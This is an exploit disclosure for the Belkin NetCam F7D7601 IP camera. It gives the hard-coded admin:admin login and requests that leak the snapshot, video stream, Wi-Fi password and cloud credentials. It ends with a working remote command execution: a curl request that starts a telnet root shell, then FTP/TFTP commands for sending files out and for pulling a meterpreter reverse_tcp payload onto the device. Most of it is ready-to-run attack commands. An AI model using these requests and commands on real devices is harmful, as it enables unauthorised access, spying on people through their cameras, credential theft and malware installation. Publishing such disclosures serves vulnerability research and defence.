# Exploit Title: Belkin NetCam F7D7601 | Remote Command Execution
# Date: 17/07/17
# Exploit Author: Wadeek
# Vendor Homepage: http://www.belkin.com/
# Tested on: Belkin NetCam F7D7601 (WeMo_NetCam_WW_2.00.10684.PVT)
================================================
##
UnsetupMode == [0]
Hard-coded password admin:admin - SetupMode == [1]
##
================================================
##
[1] BusyBox version & Linux version & gcc version >> GET http://[IP]:80/goform/syslog
[1] System version >> GET http://[IP]:80/goform/getSystemSettings?systemModel&systemVersion&brandName&longBrandName
[1] Camera snapshot >> GET http://[IP]:80/goform/snapshot
[1] Camera streaming >> GET http://[IP]:80/goform/video
[101] Disclosure username and password on netcam.belkin.com >> GET http://[IP]:80/goform/apcamMode
[101] Disclosure wifi password >> GET http://[IP]:80/apcam/for-android/aplist.asp
[0] Firmware version >> GET http://[IP]:[49150..49159]/setup.xml
##
================================================
#||
================================================
[0] Network Fingerprinting
##
80/tcp open http
HTTP/1.1 404 Site or Page Not Found
Server: Camera Web Server
<title>Document Error: Site or Page Not Found</title>
<h2>Access Error: Site or Page Not Found</h2>
<p>Page Not Found</p>
&&
[49150..49159]/tcp open UPnP
HTTP/0.0 400 Bad Request
SERVER: Unspecified, UPnP/1.0, Unspecified
<h1>400 Bad Request</h1>
##
================================================
#||
================================================
[1] Wireless Fingerprinting
##
ESSID:"NetCamXXXX"
Encryption key:off
Address: C0:56:27
##
[1] Network Fingerprinting
##
80/tcp open http
HTTP/1.1 401 Unauthorized
Server: Camera Web Server
WWW-Authenticate: Basic realm="Camera Web Server"
<title>Document Error: Unauthorized</title>
<h2>Access Error: Unauthorized</h2>
<p>Access to this document requires a User ID</p>
##
[1] Remote Command Execution
/!/ !/
:~$ curl 'http://[IP]/goform/SystemCommand?command=telnetd%20-l%20/bin/sh' -H 'Authorization: Basic YWRtaW46YWRtaW4='
:~$ telnet [IP] 23
upload by FTP # ftpput -v -u [USERNAME] -p [PASSWORD] -P [PORT] [IP] [REMOTE-FILENAME] [LOCAL-FILENAME]
upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]
/!/ !/
================================================